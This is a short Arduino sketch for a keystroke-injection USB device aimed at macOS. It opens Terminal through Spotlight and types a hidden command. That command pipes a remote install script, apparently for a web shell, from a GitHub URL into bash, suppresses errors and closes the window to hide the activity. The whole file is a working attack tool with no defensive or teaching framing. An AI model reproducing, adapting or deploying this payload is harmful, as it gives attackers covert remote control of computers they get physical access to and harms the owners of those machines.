#include <Arduino.h>
#include <Keyboard.h>

void setup() {
  Keyboard.begin();

  //Wait for detection (and for "network device connected" message)
  delay(5000);

  //Dismiss "netword device connected" message
  Keyboard.press(KEY_LEFT_GUI);
  delay(25);
  Keyboard.press('.');
  delay(25);
  Keyboard.releaseAll();
  delay(250);


  //Launch terminal
  Keyboard.press(KEY_LEFT_GUI);
  delay(25);
  Keyboard.press(' ');
  delay(25);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("Terminal");
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(25);
  Keyboard.releaseAll();
  delay(5000);


  Keyboard.print(" nohup curl -s https://raw.githubusercontent.com/teeheeheeaaahhaha/webshell/master/dist/install.sh | bash 2> /tmp/blah & 2> /tmp/blah ; osascript -e 'tell application \"Terminal\" to close first window' & exit");
  delay(25);
  Keyboard.press(KEY_RETURN);
  delay(25);
  Keyboard.releaseAll();
}

void loop() {}
